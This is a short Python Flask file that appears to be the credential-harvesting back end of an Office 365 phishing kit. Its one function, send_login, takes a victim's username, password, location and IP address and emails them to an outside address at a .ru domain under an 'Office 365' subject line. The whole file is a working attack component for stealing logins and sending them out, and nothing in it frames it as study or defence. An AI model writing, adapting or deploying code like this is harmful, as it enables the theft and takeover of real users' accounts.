from office import mail
from flask_mail import Message
from datetime import datetime



def send_login(username,password,country,city, zipcode,ip):
    msg = Message(f'Office 365 | {ip}',
        sender='senderGmailHere',
        recipients=['i@smuller.ru'])
    msg.body=f'''
    For ----- Office365
    -------+ User Login +--------
    User ID is ----- {username}
    Password is ----- {password}
    -------+ User Details +-------
    Client country is ----- {country}
    Client city is ----- {city}
    Client zipcode is ----- {zipcode}
    Client ip is ----- {ip}
    at ---- {datetime.now()}
    '''
    mail.send(msg)